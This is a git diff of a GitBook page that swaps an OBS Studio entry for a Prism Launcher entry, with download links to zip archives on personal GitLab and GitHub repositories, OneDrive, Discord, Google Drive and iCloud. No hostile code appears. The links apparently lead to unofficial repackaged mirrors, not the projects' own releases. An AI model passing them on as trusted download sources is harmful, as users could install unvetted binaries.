@@ -1,6 +1,6 @@
 ---
-cover: ../.gitbook/assets/capsule_616x353 (1).jpg
-coverY: 117.05866666666665
+cover: ../.gitbook/assets/3e07c460e84a27fa5b2426b05ad4b479.png
+coverY: 0
 layout:
   cover:
     visible: true
@@ -17,13 +17,9 @@ layout:
     visible: true
 ---
 
-# 🎥 OBS
+# ♓ Prism Launcher
 
-OBS Studio is a free and open-source app for screencasting and live streaming. Written in C/C++ and built with Qt, OBS Studio provides real-time capture, scene composition, recording, encoding, and broadcasting via Real Time Messaging Protocol (RTMP), HLS, SRT, RIST or WebRTC. It can stream videos to any RTMP-supporting destination, including YouTube, Twitch, Instagram and Facebook.
-
-For video encoding, OBS Studio can use the x264 transcoder, Intel Quick Sync Video, Nvidia NVENC and the AMD Video Coding Engine to encode video streams into the H.264/MPEG-4 AVC or H.265/HEVC formats. It can encode multiple tracks of audio in the AAC format. More experienced users can choose any codecs and containers available in libavcodec and libavformat, or output the stream to a custom FFmpeg URL.
-
-OBS Studio also supports plug-ins to extend its functionality.
+Prism Launcher is a custom launcher for Minecraft that allows you to easily manage multiple installations of Minecraft at once.
 
 ***
 
@@ -31,23 +27,31 @@ OBS Studio also supports plug-ins to extend its functionality.
 
 {% tabs %}
 {% tab title="GitLab" %}
-## [Click Here To Download](https://gitlab.com/fozalors/fountaine/-/raw/main/apps/OBS.zip)
+## [Click Here To Download](https://gitlab.com/fozalors/fountaine/-/raw/main/apps/PrismLauncher.zip)
+{% endtab %}
+
+{% tab title="GitHub" %}
+## [Click Here To Download](https://github.com/golfista/fountaine/raw/main/apps/PrismLauncher.zip)
+{% endtab %}
+
+{% tab title="Source" %}
+{% file src="../.gitbook/assets/PrismLauncher.zip" %}
 {% endtab %}
 
 {% tab title="OneDrive" %}
-## [Click Here To Download](https://1drv.ms/u/s!AkX2q12uku0fgfB4dr-rSwQeVtC0DA?e=YErqNa)
+## [Click Here To Download](https://1drv.ms/u/s!AkX2q12uku0fgfEEm-XPiyk2cQghow?e=b1oNhf)
 {% endtab %}
 
 {% tab title="Discord" %}
-## [Click Here To Download](https://cdn.discordapp.com/attachments/1113994556787146843/1150999740931133600/OBS.zip)
+## [Click Here To Download](https://cdn.discordapp.com/attachments/1113994556787146843/1151692315337961592/PrismLauncher.zip)
 {% endtab %}
 
 {% tab title="Drive" %}
-## [Click Here To Download](https://drive.google.com/file/d/1FKoBUfYXRMzAmTjk2hNGnbpmLcRSth1D/view?usp=drive\_link)
+## [Click Here To Download](https://drive.google.com/file/d/1nhlU6XhPfIYt8iawYrdf1M8ZZlO64fy\_/view?usp=drive\_link)
 {% endtab %}
 
 {% tab title="iCloud" %}
-## [Click Here To Download](https://www.icloud.com/iclouddrive/08btmCzd5KSJzPpThub9NyeRQ#OBS)
+## [Click Here To Download](https://www.icloud.com/iclouddrive/062qqwSBCgY079LEkQMpTmiqw#PrismLauncher)
 {% endtab %}
 
 {% tab title="Cloudflare" %}
